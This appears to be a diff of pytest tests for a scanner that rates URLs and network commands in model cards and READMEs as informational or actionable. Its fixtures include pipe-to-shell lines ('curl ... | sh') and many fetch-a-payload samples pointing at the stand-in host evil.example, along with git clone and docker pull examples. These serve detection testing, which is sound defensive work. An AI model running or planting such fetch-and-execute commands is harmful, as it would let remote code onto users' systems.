-            'model = OmniVoice.from_pretrained("k2-fsa/OmniVoice")\n'
-            'audio = model.generate(ref_audio="ref.wav")\n'
-            'sf.write("out.wav", audio[0], 24000)\n'
-            "```\n"
-        ),
-        encoding="utf-8",
-    )
 
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 6,
+    check = next(
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://huggingface.co/datasets/trivia_qa",
         }
-    ).scan(str(text_path))
-    aggregate = scan_model_directory_or_file(
-        str(text_path),
-        cache_enabled=False,
-        check_secrets=False,
-        text_content_max_findings=6,
     )
-
-    assert result.success is True
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://download.pytorch.org/whl/cu128"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert any(
-        check.details.get("type") == "detector_finding_limit"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
+    assert check.details["column"] == len(prefix) + 1
 
 
-def test_text_scanner_fenced_documentation_trusted_package_index_download_sink_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl https://download.pytorch.org/whl/cu128 | sh
-```
-""",
-        encoding="utf-8",
-    )
+def test_text_scanner_model_card_cloud_url_preserves_higher_actionable_severity(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text('endpoint = "https://bucket.s3.amazonaws.com/cmd.sh"\n', encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
 
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://download.pytorch.org/whl/cu128"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize(
-    ("model_revision", "content", "expected_url"),
-    [
-        (
-            "google/gemma-4-E2B-it-qat-q4_0-gguf@1894d1fc0a19d86697abd40483f5983c867df03f",
-            (
-                "---\n"
-                "license_link: https://ai.google.dev/gemma/docs/gemma_4_license\n"
-                "---\n\n"
-                "<img src=https://ai.google.dev/gemma/images/gemma4_banner.png>\n"
-                '<a href="https://github.com/google-gemma">GitHub</a>\n'
-                '<a href="https://huggingface.co/collections/google/gemma-4">Hugging Face</a>\n'
-                '<a href="https://ai.google.dev/gemma/docs/core">Documentation</a>\n'
-            ),
-            "https://ai.google.dev/gemma/docs/gemma_4_license",
-        ),
-        (
-            "google-bert/bert-base-cased@cd5ef92a9fb2f889e972770a36d4ed042daf221e",
-            (
-                "BERT is described in [this paper](https://arxiv.org/abs/1810.04805) and "
-                "[this repository](https://github.com/google-research/bert).\n\n"
-                "```bibtex\n"
-                "  url       = {http://arxiv.org/abs/1810.04805},\n"
-                "  biburl    = {https://dblp.org/rec/journals/corr/abs-1810-04805.bib},\n"
-                "  bibsource = {dblp computer science bibliography, https://dblp.org}\n"
-                "```\n"
-                '<img width="300px" src="https://cdn-media.huggingface.co/exbert/button.png">\n'
-            ),
-            "http://arxiv.org/abs/1810.04805",
-        ),
-    ],
-)
-def test_text_scanner_pinned_model_card_reference_urls_are_informational(
-    tmp_path: Path,
-    model_revision: str,
-    content: str,
-    expected_url: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(f"{content}\n<!-- {model_revision} -->\n", encoding="utf-8")
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == expected_url
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-@pytest.mark.parametrize(
-    ("fence_language", "content", "expected_url"),
-    [
-        (
-            "bash",
-            "curl https://ai.google.dev/gemma/docs/gemma_4_license | sh\n",
-            "https://ai.google.dev/gemma/docs/gemma_4_license",
-        ),
-        (
-            "python",
-            'requests.get("http://arxiv.org/abs/1810.04805")\n',
-            "http://arxiv.org/abs/1810.04805",
-        ),
-    ],
-)
-def test_text_scanner_pinned_model_card_reference_urls_executable_context_remains_actionable(
-    tmp_path: Path,
-    fence_language: str,
-    content: str,
-    expected_url: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(f"```{fence_language}\n{content}```\n", encoding="utf-8")
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == expected_url
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_pinned_qwen2_vl_readme_requests_example_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        (
-            "<!-- Qwen/Qwen2-VL-2B-Instruct@895c3a49bc3fa70a340399125c650a463535e71c -->\n"
-            "```python\n"
-            "from PIL import Image\n"
-            "import requests\n\n"
-            'url = "https://qianwen-res.oss-cn-beijing.aliyuncs.com/Qwen-VL/assets/demo.jpeg"\n'
-            "image = Image.open(requests.get(url, stream=True).raw)\n"
-            "```\n\n"
-            "```bibtex\n"
-            "@article{Qwen-VL,\n"
-            "  journal={arXiv preprint arXiv:2308.12966},\n"
-            "  year={2023}\n"
-            "}\n"
-            "```\n"
-        ),
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
+    network_checks = _failed_network_detection_checks(result)
+    assert len(network_checks) == 1
+    check = network_checks[0]
+    assert check.severity == IssueSeverity.CRITICAL
+    assert check.details["type"] == "cloud_storage_url"
+    assert check.details["severity"] == "HIGH"
+    assert check.details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://bucket.s3.amazonaws.com/cmd.sh",
     }
-    assert {"network_function", "network_library", "suspicious_port", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
+    assert {finding["type"] for finding in check.details["deduplicated_related_findings"]} == {
+        "domain_name",
+        "url_detected",
+    }
+    assert determine_exit_code(aggregate) == 1
 
 
-def test_text_scanner_pinned_qwen2_vl_requests_example_executable_text_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        (
-            "import requests\n\n"
-            'url = "https://qianwen-res.oss-cn-beijing.aliyuncs.com/Qwen-VL/assets/demo.jpeg"\n'
-            "requests.get(url, stream=True)\n"
-        ),
-        encoding="utf-8",
-    )
+def test_text_scanner_model_card_endpoint_label_markdown_link_stays_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("Endpoint: [API docs](https://docs.example.com)\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
 
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
+    network_checks = _failed_network_detection_checks(result)
 
-
-def test_text_scanner_pinned_unsloth_gemma_gguf_readme_reporting_limit_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        (
-            "<!-- unsloth/gemma-4-E2B-it-qat-GGUF@db01ae3ceeca98487bf3569814f832f5023cd48c -->\n"
-            "# Gemma 4 E2B QAT GGUF\n\n"
-            "Model card: https://huggingface.co/unsloth/gemma-4-E2B-it-qat-GGUF\n"
-            "Base model: https://huggingface.co/google/gemma-4-E2B-it\n"
-            "Quantization notes: https://github.com/unslothai/unsloth\n"
-            "Documentation: https://github.com/ggml-org/llama.cpp/blob/master/docs/build.md\n"
-            "Paper: http://arxiv.org/abs/2403.08295\n\n"
-            "```bash\n"
-            "git clone https://github.com/ggml-org/llama.cpp\n"
-            "cd llama.cpp\n"
-            "cmake -B build\n"
-            "```\n\n"
-            "More references: https://huggingface.co/docs/hub/models-cards\n"
-            "License: https://ai.google.dev/gemma/terms\n"
-        ),
-        encoding="utf-8",
-    )
-
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 4,
-        }
-    ).scan(str(text_path))
-    aggregate = scan_model_directory_or_file(
-        str(text_path),
-        cache_enabled=False,
-        check_secrets=False,
-        text_content_max_findings=4,
-    )
-
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
-    assert any(
-        check.name == "Network Communication Reporting Limit"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(
-        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_pinned_hunyuan3d_model_cards_are_informational(tmp_path: Path) -> None:
-    model_dir = tmp_path / "tencent_hunyuan3d_2"
-    model_dir.mkdir()
-    (model_dir / "README.md").write_text(
-        (
-            "<!-- tencent/Hunyuan3D-2@9cd649ba6913f7a852e3286bad86bfa9a2d83dcf -->\n"
-            "# Hunyuan3D-2\n\n"
-            "Project page: https://github.com/Tencent-Hunyuan/Hunyuan3D-2\n"
-            "Paper: https://arxiv.org/abs/2501.12202\n"
-            "Demo: https://huggingface.co/spaces/tencent/Hunyuan3D-2\n"
-            "Documentation: https://huggingface.co/docs/diffusers/index\n"
-            "Dataset notes: https://huggingface.co/datasets/tencent/Hunyuan3D-2\n"
-        ),
-        encoding="utf-8",
-    )
-    (model_dir / "model_card.md").write_text(
-        (
-            "Additional references for Hunyuan3D-2:\n"
-            "- https://github.com/Tencent-Hunyuan/Hunyuan3D-2/blob/main/README.md\n"
-            "- https://huggingface.co/tencent/Hunyuan3D-2\n"
-            "- https://huggingface.co/tencent/Hunyuan3D-2mv\n"
-            "- https://github.com/Tencent-Hunyuan/Hunyuan3D-2/tree/main/docs\n"
-            "- https://huggingface.co/papers/2501.12202\n"
-        ),
-        encoding="utf-8",
-    )
-
-    aggregate = scan_model_directory_or_file(
-        str(model_dir),
-        cache_enabled=False,
-        check_secrets=False,
-        text_content_max_findings=4,
-    )
-
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
     assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
-    ("content", "command_type"),
+    "content",
     [
-        ("git clone https://evil.example/repo.git\n", "git_clone"),
-        ("docker pull evil.example/model\n", "docker_pull"),
+        "- Endpoint: [API docs](https://docs.example.com)\n",
+        "Intro\n- Endpoint: [API docs](https://docs.example.com)\n",
+        "- Callback: [API docs](https://docs.example.com)\n",
+        "- Webhook: [API docs](https://docs.example.com)\n",
     ],
 )
-def test_text_scanner_fenced_untrusted_network_commands_remain_actionable(
+def test_text_scanner_model_card_capitalized_bullet_label_markdown_links_stay_informational(
     tmp_path: Path,
     content: str,
-    command_type: str,
 ) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(f"```bash\n{content}```\n", encoding="utf-8")
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_markdown_link_context_prefix_remains_bounded() -> None:
+    payload = b"intro\n" + (b"a" * (MAX_TEXT_FINDING_CONTEXT_BYTES * 4)) + b"\n[API docs](https://docs.example.com)\n"
+    position = payload.index(b"https://")
+
+    context_prefix = TextScanner._documentation_markdown_link_context_prefix(payload, position)
+
+    assert context_prefix is not None
+    assert len(context_prefix) <= MAX_TEXT_FINDING_CONTEXT_BYTES
+
+
+def test_text_scanner_url_evidence_at_position_bounds_long_xml_prefix(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    url = b"https://evil.example/payload.sh"
+    attrs = b"".join(
+        b" data" + str(index).encode("ascii") + b'="scheme' + str(index).encode("ascii") + b"://" + (b"x" * 64) + b'"'
+        for index in range(512)
+    )
+    payload = b"<cfg:endpoint" + attrs + b' callback="' + url + b'"></cfg:endpoint>\n'
+    position = payload.index(url)
+    line_lookup = {position: (0, len(payload) - 1, 1)}
+    finding = {
+        "type": "url_detected",
+        "severity": "HIGH",
+        "url": url.decode("ascii"),
+        "position": position,
+    }
+
+    assert TextScanner._documentation_finding_is_actionable(payload, finding)
+
+    original_pattern = text_scanner_module.BARE_NETWORK_URL_TOKEN_PATTERN
+
+    class BoundedUrlPattern:
+        max_candidate_bytes: int = 0
+
+        def fullmatch(self, candidate: bytes) -> Any:
+            self.max_candidate_bytes = max(self.max_candidate_bytes, len(candidate))
+            assert len(candidate) <= len(url)
+            return original_pattern.fullmatch(candidate)
+
+    bounded_pattern = BoundedUrlPattern()
+    monkeypatch.setattr(text_scanner_module, "BARE_NETWORK_URL_TOKEN_PATTERN", bounded_pattern)
+
+    evidence = TextScanner._documentation_url_evidence_at_position(payload, position, line_lookup)
+
+    assert bounded_pattern.max_candidate_bytes == len(url)
+    assert evidence == {
+        "kind": "url",
+        "value": url.decode("ascii"),
+        "line": 1,
+        "column": position + 1,
+        "span_start": position,
+        "span_end": position + len(url),
+    }
+
+
+def test_text_scanner_model_card_unknown_xml_markdown_context_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(text_scanner_module, "MAX_TEXT_TRUNCATED_XML_CONTEXT_BYTES", 64)
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '<endpoint data="' + ("x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 128)) + '">download '
+        "[here](https://evil.example/payload.sh)</endpoint>\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("closing_tag", ["</endpoint>", "</webhook>"])
+def test_text_scanner_model_card_truncated_xml_closing_tag_markdown_context_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    closing_tag: str,
+) -> None:
+    monkeypatch.setattr(text_scanner_module, "MAX_TEXT_TRUNCATED_XML_CONTEXT_BYTES", 64)
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '<endpoint data="'
+        + ("x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 128))
+        + f'">{closing_tag}download [here](https://evil.example/payload.sh)</endpoint>\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("closing_tag", ["</endpoint>", "</webhook>"])
+def test_text_scanner_model_card_truncated_xml_closing_tag_direct_url_context_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    closing_tag: str,
+) -> None:
+    monkeypatch.setattr(text_scanner_module, "MAX_TEXT_TRUNCATED_XML_CONTEXT_BYTES", 64)
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '<endpoint data="'
+        + ("x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 128))
+        + f'">{closing_tag}download https://evil.example/payload.sh</endpoint>\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_direct_endpoint_url_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("endpoint: https://evil.example/payload\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
 
     assert any(
         check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == command_type
+        and check.details.get("type") == "url_detected"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- endpoint:\n  url: https://evil.example/payload.sh\n",
+        "- callback:\n  uri: https://evil.example/payload.sh\n",
+        "- webhook:\n  url: https://evil.example/payload.sh\n",
+    ],
+)
+def test_text_scanner_model_card_top_level_list_object_endpoint_urls_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_namespaced_xml_endpoint_url_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("<cfg:endpoint>https://evil.example/payload.sh</cfg:endpoint>\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "<cfg:endpoint>download https://evil.example/payload.sh</cfg:endpoint>\n",
+        "<endpoint></webhook>download https://evil.example/payload.sh</endpoint>\n",
+        "<endpoint></endpointDocs>download https://evil.example/payload.sh</endpoint>\n",
+        "<callback></callbackDocs>download https://evil.example/payload.sh</callback>\n",
+        "<webhook></webhookDocs>download https://evil.example/payload.sh</webhook>\n",
+        '<endpoint data="' + ("x" * 5000) + '"></webhook>download https://evil.example/payload.sh</endpoint>\n',
+        '<endpoint url="https://evil.example/payload.sh" />\n',
+        '<cfg:endpoint value="https://evil.example/payload.sh" />\n',
+        '<cfg:endpoint data="' + ("x" * 600) + '" url="https://evil.example/payload.sh" />\n',
+        '<cfg:endpoint data="' + ("x" * 600) + '">download https://evil.example/payload.sh</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 5000) + '">download https://evil.example/payload.sh</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 5000) + '" /> curl https://evil.example/payload.sh\n',
+        '<cfg:endpoint data="' + ("x" * 17000) + '">download https://evil.example/payload.sh</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 17000) + '" /> curl https://evil.example/payload.sh\n',
+    ],
+)
+def test_text_scanner_model_card_leading_text_namespaced_xml_endpoint_url_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '{"endpoint": "[download](https://evil.example/payload.sh)"}\n',
+        "endpoint: [download](https://evil.example/payload.sh)\n",
+        "Intro\nendpoint: [download](https://evil.example/payload.sh)\n",
+        "callback: [download](https://evil.example/payload.sh)\n",
+        "webhook: [download](https://evil.example/payload.sh)\n",
+        'endpoint: "[download](https://evil.example/payload.sh)"\n',
+        'endpoint:\n  url: "[download](https://evil.example/payload.sh)"\n',
+        "endpoints:\n- [download](https://evil.example/payload.sh)\n",
+        "endpoints:\n  - [download](https://evil.example/payload.sh)\n",
+        "callback:\n- [download](https://evil.example/payload.sh)\n",
+        "webhooks:\n  - [download](https://evil.example/payload.sh)\n",
+        "- endpoint: [download](https://evil.example/payload.sh)\n",
+        "Intro\n- endpoint: [download](https://evil.example/payload.sh)\n",
+        "- callback: [download](https://evil.example/payload.sh)\n",
+        "- webhook: [download](https://evil.example/payload.sh)\n",
+        "- endpoint:\n  url: [download](https://evil.example/payload.sh)\n",
+        "- callback:\n  uri: [download](https://evil.example/payload.sh)\n",
+        "- webhook:\n  url: [download](https://evil.example/payload.sh)\n",
+        "<endpoint>[download](https://evil.example/payload.sh)</endpoint>\n",
+    ],
+)
+def test_text_scanner_model_card_structured_endpoint_markdown_links_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '{"endpoint": "download [here](https://evil.example/payload.sh)"}\n',
+        'endpoint: "download [here](https://evil.example/payload.sh)"\n',
+        "endpoint: 'don''t use [here](https://evil.example/payload.sh)'\n",
+        'endpoint:\n  url: "download [here](https://evil.example/payload.sh)"\n',
+        'endpoints:\n- url: "download [here](https://evil.example/payload.sh)"\n',
+        "<endpoint>download [here](https://evil.example/payload.sh)</endpoint>\n",
+        "<endpoint></webhook>download [here](https://evil.example/payload.sh)</endpoint>\n",
+        '<endpoint data="'
+        + ("x" * 17000)
+        + '"></endpointDocs>download [here](https://evil.example/payload.sh)</endpoint>\n',
+        "<callback></callbackDocs>download [here](https://evil.example/payload.sh)</callback>\n",
+        "<webhook></webhookDocs>download [here](https://evil.example/payload.sh)</webhook>\n",
+        "<cfg:endpoint>download [here](https://evil.example/payload.sh)</cfg:endpoint>\n",
+        '<endpoint label="download [here](https://evil.example/payload.sh)" />\n',
+        '<cfg:endpoint data="' + ("x" * 600) + '">download [here](https://evil.example/payload.sh)</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 4200) + '">download [here](https://evil.example/payload.sh)</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 17000) + '">download [here](https://evil.example/payload.sh)</cfg:endpoint>\n',
+        '<endpoint data="' + ("x" * 5000) + '"></webhook>download [here](https://evil.example/payload.sh)</endpoint>\n',
+    ],
+)
+def test_text_scanner_model_card_leading_text_structured_endpoint_markdown_links_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "<endpoint>API docs</endpoint> https://docs.example.com/reference\n",
+        "<endpoint>API docs</endpoint> [API docs](https://docs.example.com/reference)\n",
+        '<endpoint data="' + ("x" * 5000) + '">API docs</endpoint> https://docs.example.com/reference\n',
+        "<endpoint /> [API docs](https://docs.example.com/reference)\n",
+        '<endpoint enabled="false" /> [API docs](https://docs.example.com/reference)\n',
+        '<endpoint note=">" /> [API docs](https://docs.example.com/reference)\n',
+        '<endpoint data="' + ("x" * 5000) + '" /> https://docs.example.com/reference\n',
+        '<endpoint data="' + ("x" * 17000) + '" /> https://docs.example.com/reference\n',
+        '<endpoint data="' + ("x" * 5000) + '" /> [API docs](https://docs.example.com/reference)\n',
+    ],
+)
+def test_text_scanner_model_card_closed_xml_endpoint_links_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- endpoint:\n- url: https://docs.example.com/reference\n",
+        "- endpoint:\n- url: [API docs](https://docs.example.com/reference)\n",
+    ],
+)
+def test_text_scanner_model_card_sibling_yaml_list_items_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_namespaced_xml_endpoint_markdown_link_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "<cfg:endpoint>[download](https://evil.example/payload.sh)</cfg:endpoint>\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_deduplicates_git_clone_url_evidence(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("git clone https://evil.example/repo.git\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    assert len(network_checks) == 1
+    check = network_checks[0]
+    assert check.severity == IssueSeverity.CRITICAL
+    assert check.details["type"] == "network_command"
+    assert check.details["command_type"] == "git_clone"
+    assert check.details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://evil.example/repo.git",
+    }
+    assert {finding["type"] for finding in check.details["deduplicated_related_findings"]} == {
+        "domain_name",
+        "url_detected",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
